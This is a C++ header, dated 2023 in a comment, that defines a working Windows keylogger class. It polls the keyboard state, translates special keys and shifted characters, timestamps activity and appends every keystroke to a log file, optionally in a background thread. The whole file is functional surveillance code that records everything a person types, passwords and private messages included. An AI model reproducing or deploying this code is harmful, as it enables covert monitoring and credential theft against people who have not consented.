// code from 2023
// author vende11s
#pragma once
#pragma warning(disable : 4996)

#include <string>
#include <fstream>
#include <thread>
#include <exception>
#include <vector>
#include <algorithm>
#include <chrono>
#include <ctime>
#include <utility>
#include <sstream>
#include <iomanip>

#include <Windows.h>

namespace keylogger {
    class keylogger {
        std::string _filename;
        bool state_keylogger = false;
        bool log = false;
        std::thread t1;

        void LOG(std::string input) {
            if (log == true)
                std::clog << input;

            std::fstream LogFile;
            LogFile.open(_filename, std::fstream::app);
            LogFile << input;
        }

        bool SpecialKeys(int S_Key) {
            // numpad
            if (S_Key >= 96 && S_Key <= 105) {
                S_Key -= 96;
                LOG(std::to_string(S_Key));
                return true;
            }

            switch (S_Key) {
            case VK_SPACE:
                LOG(" ");
                return true;
            case VK_RETURN:
                LOG("#ENTER#\n");
                return true;
            case '¾':
                LOG(".");
                return true;
            case VK_SHIFT:
               // LOG("#SHIFT#");
                return true;
            case VK_BACK:
                LOG("#BACKSPACE#");
                return true;
            case VK_RBUTTON:
                LOG("#R_CLICK#");
                return true;
            case VK_CAPITAL:
                LOG("#CAPS_LOCK#");
                return true;
            case VK_TAB:
                LOG("#TAB#");
                return true;
            case VK_UP:
                LOG("#UP_ARROW_KEY#");
                return true;
            case VK_DOWN:
                LOG("#DOWN_ARROW_KEY#");
                return true;
            case VK_LEFT:
                LOG("#LEFT_ARROW_KEY#");
                return true;
            case VK_RIGHT:
                LOG("#RIGHT_ARROW_KEY#");
                return true;
            case VK_CONTROL:
                LOG("#CONTROL#");
                return true;
            case VK_MENU:
                LOG("#ALT#");
                return true;
            case 173:
                LOG("#VOLUME_MUTE_KEY#");
                return true;
            case 174:
                LOG("#VOLUME_LOW#");
                return true;
            case 175:
                LOG("#VOLUME_HIGH#");
                return true;
            case 45:
                LOG("#INSERT#");
                return true;
            case 188:
                LOG(",");
                return true;
            case 190:
                LOG(".");
                return true;
            case 186:
                LOG(";");
                return true;
            case 189:
                LOG("-");
                return true;
            case 187:
                LOG("=");
                return true;
            case 7:
                LOG("#ESC#");
                return true;

            default:
                return false;
            }
        }

        bool capslockState() {
            return (GetKeyState(VK_CAPITAL) & 0x0001) != 0;
        }

        bool isShiftPressed() {
            return GetAsyncKeyState(VK_SHIFT);
        }

        int shiftPressed(int KEY) {
            if (KEY >= 'a' && KEY <= 'z') {
                KEY -= 32;
                return KEY;
            }

            if (KEY >= 'A' && KEY <= 'Z' && capslockState() == true)
                KEY += 32;  // to lowercase

            if (KEY >= '0' && KEY <= '9') {
                const std::string temp = ")!@#$%^&*(";
                KEY -= 48;
                KEY = temp[KEY];
                return KEY;
            }

            if (KEY == 188)
                return '<';
            if (KEY == 190)
                return '.';
            if (KEY == 186)
                return ':';
            if (KEY == 189)
                return '_';
            if (KEY == 187)
                return '+';

            return KEY;
        }

        void logTime() {
            auto now = std::chrono::system_clock::now();
            auto in_time_t = std::chrono::system_clock::to_time_t(now);

            std::stringstream ss;
            ss << std::put_time(std::localtime(&in_time_t), "%Y-%m-%d %X");
            LOG("\n[" + ss.str() + "]\n");
        }

        void instance() {
            logTime();
            auto last_log_time = std::chrono::system_clock::now();

            while (state_keylogger) {
                Sleep(5);
                for (int KEY = 8; KEY <= 190; KEY++) {
                    if (GetAsyncKeyState(KEY) == -32767) {
                        // for some reason those keys are also present with shift, alt, etc.
                        if (KEY >= 160 && KEY <= 164)
                            continue;

                        auto act_time = std::chrono::system_clock::now();
                        std::chrono::duration<double> diff = act_time - last_log_time;

                        if (diff.count() > 60) {
                            logTime();
                        }
                        last_log_time = act_time;

                        if (SpecialKeys(KEY) == true)
                            continue;

                        if (KEY >= 'A' && KEY <= 'Z' && capslockState() == false)
                            KEY += 32;  // to lowercase

                        if (isShiftPressed())
                            KEY = shiftPressed(KEY);

                        std::string s;
                        s += static_cast<char>(KEY);
                        LOG(s);
                    }
                }
            }
        }

    public:
        explicit keylogger(std::string filename = "", bool console_log = false) {
            _filename = filename;
            log = console_log;
        }

        ~keylogger() {
            stopThread();
        }

        void setFilename(std::string filename) {
            _filename = filename;
        }

        void setConsoleLogging(bool console_log) {
            log = console_log;
        }

        void start() {
            if (state_keylogger == true)
                return;
            state_keylogger = true;
            instance();
        }

        void startThread() {
            if (state_keylogger == true)
                return;

            state_keylogger = true;
            t1 = std::thread(&keylogger::instance, this);
        }

        void stopThread() {
            if (state_keylogger == false)
                return;

            state_keylogger = false;
            if (t1.joinable())
                t1.join();
        }

        std::string getLogs() {
            if (_filename.empty())
                throw std::runtime_error("filename not specified");

            std::ifstream ifs(_filename);
            if (!ifs.is_open() || !ifs.good())
                throw std::runtime_error("can't access file");

            std::string logs = "";
            std::string s;
            while (std::getline(ifs, s)) {
                logs += s + "\n";
            }

            return logs;
        }

        bool state() {
            return state_keylogger;
        }
    };
}  // namespace keylogger
